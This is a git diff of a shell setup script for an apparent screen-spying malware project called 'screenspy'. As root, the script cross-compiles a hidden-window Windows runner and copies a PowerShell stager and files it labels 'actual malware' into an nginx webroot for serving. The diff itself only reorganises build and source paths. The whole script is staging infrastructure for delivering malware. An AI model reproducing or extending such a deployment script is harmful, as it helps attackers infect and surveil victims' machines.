@@ -6,7 +6,8 @@ if [ "$EUID" -eq 0 ]; then
     apt install nginx python3 python3-venv python3-pil mingw-w64-common
     
     echo "Compiling process creator"
-    x86_64-w64-mingw32-gcc runner.c -o runner.exe -mwindows
+    mkdir ../builds/
+    cd ../src/ && x86_64-w64-mingw32-gcc runner.c -o ../builds/runner.exe -mwindows
     echo "Sucessfully compiled process creator"
 
 
@@ -17,17 +18,17 @@ if [ "$EUID" -eq 0 ]; then
 
 
     echo "Copying stager script into webroot"
-    cp stager.ps1 /var/www/html
+    cp ../src/stager/stager.ps1 /var/www/html
     echo "Sucessfully copied"
 
     echo "Copying actual malware into webroot"
-    cp runner.exe /var/www/html
-    cp client.exe /var/www/html 2>/dev/null
-    cp client     /var/www/html 2>/dev/null
+    cp ../builds/runner.exe /var/www/html
+    cp ../builds/client.exe /var/www/html 2>/dev/null
+    cp ../builds/client     /var/www/html 2>/dev/null
     echo "Sucessfully copied"
 
     echo "Copying nginx config"
-    cp nginx.conf /etc/nginx/conf.d/screenspy.conf
+    cp ../nginx.conf /etc/nginx/conf.d/screenspy.conf
     echo "Successfully copied"
 
     echo "Everything is done restarting webserver"
